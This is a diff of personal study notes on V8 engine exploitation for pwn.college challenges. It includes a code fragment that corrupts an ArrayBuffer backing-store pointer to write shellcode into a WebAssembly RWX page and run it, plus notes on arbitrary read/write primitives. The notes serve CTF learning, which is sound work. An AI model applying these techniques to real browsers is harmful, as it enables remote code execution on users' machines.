@@ -1,6 +1,5 @@
 Challenges: 
 - pwn-college quarterly quiz
-
 ### Setup
 
 Debugging set-up:
@@ -29,7 +28,7 @@ Pointer:                |_____address_____w1|
 Smi:                    |___int31_value____0|
 ```
 
-##### Escaping the Cage
+##### Escaping the Memory Cage
 
 In Javascript `ArrayBuffer`s having a backing store that is in the heap. As such, it is not pointer compressed, and lets us get arb read and write outside of the memory cage. However, this requires having a leak already to read to.
 
@@ -44,9 +43,8 @@ console.log(rwx_region.toString(16));
 var temp_buf = new ArrayBuffer(shellcode.length)  
 var shellcode_writer = new Uint8Array(temp_buf);  
   
-ArbWrite(Number(GetAddressOf(shellcode_writer)) + 0x30, Number(BigInt(rwx_region) & BigInt(0xffffff  
-ff)), Number(BigInt(rwx_region) >> BigInt(32)));  
-  
+ArbWrite(Number(GetAddressOf(shellcode_writer)) + 0x30, Number(BigInt(rwx_region) & BigInt(0xffffffff)), Number(BigInt(rwx_region) >> BigInt(32)));  
+
 for(let i = 0; i < shellcode.length; i++){  
    shellcode_writer[i] = shellcode.charCodeAt(i);  
 }  
@@ -54,6 +52,8 @@ instance.exports.trigger()
 ```
 
 However, this no longer works on modern hardware, because of the [pkey thing](https://groups.google.com/g/v8-reviews/c/vQyf4P407zc) (I think). Instead, we escape leak libc base by.....
+
+**To escape the v8 Sandbox, read [[The Sandbox]]**.
 ### JS Objects
 
 ```
@@ -90,3 +90,8 @@ DebugPrint: 0x1c19000446e9: [JSArrayBuffer]
 ```
 
 How a JS Object's type is defined is through its map. Other stuff, such as variable name and properties, are stored in the props struct. 
+
+Here are some of the more important JS Objects to look out for:
+1) `ArrayBuffer()`. With the sandbox disabled, this object uses a full-sized 8 byte heap pointer as its backing. By overwriting this full-sized pointer, we can achieve arbread/arbwrite primitives.
+2) `JSArray` of `FixedDoubleArray`. This JS type stores elements directly in memory, in a contiguous chunk. This allows you to read/write from within the memory cage. Just remember to convert from float to bigint and vice versa.
+   
